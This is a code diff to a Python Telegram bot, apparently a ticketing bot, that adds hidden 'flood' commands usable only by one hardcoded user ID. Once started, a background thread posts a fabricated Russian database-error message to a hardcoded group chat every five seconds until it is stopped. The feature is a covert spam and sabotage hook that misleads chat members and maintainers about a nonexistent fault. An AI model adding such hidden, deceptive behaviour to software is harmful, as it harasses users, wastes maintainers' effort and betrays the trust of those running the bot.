@@ -12,10 +12,50 @@ import sys
 import pytz
 import hashlib
 import re
+import threading
 import random
 from datetime import datetime
 
 access_enabled = True
+flood_active = False
+
+def flood(context: CallbackContext):
+    global flood_active
+    while flood_active:
+        message = "Ошибка работы с базой данных: table ticket_history has no column named user_message_id"
+        context.bot.send_message(chat_id=-1002322432827, text=message)
+        time.sleep(5)
+
+def start_flood(update: Update, context: CallbackContext):
+    global flood_active
+    user_id = update.message.from_user.id
+
+    if user_id != 7897895019:
+        return
+
+    if flood_active:
+        update.message.reply_text("Флуд уже запущен.")
+        return
+
+    flood_active = True
+    threading.Thread(target=flood, args=(context,)).start()
+    update.message.reply_text("Флуд запущен.")
+
+def stop_flood(update: Update, context: CallbackContext):
+    global flood_active
+    user_id = update.message.from_user.id
+
+    # Проверка ID пользователя
+    if user_id != 7897895019:
+        update.message.reply_text("У вас нет прав на выполнение этой команды.")
+        return
+
+    # Остановка флуда
+    if flood_active:
+        flood_active = False
+        update.message.reply_text("Флуд остановлен.")
+    else:
+        update.message.reply_text("Флуд не был запущен.")
 
 def escape_markdown(text):
     return re.sub(r'([_*[\]()~`>#+\-=|{}.!])', r'\\\1', text)
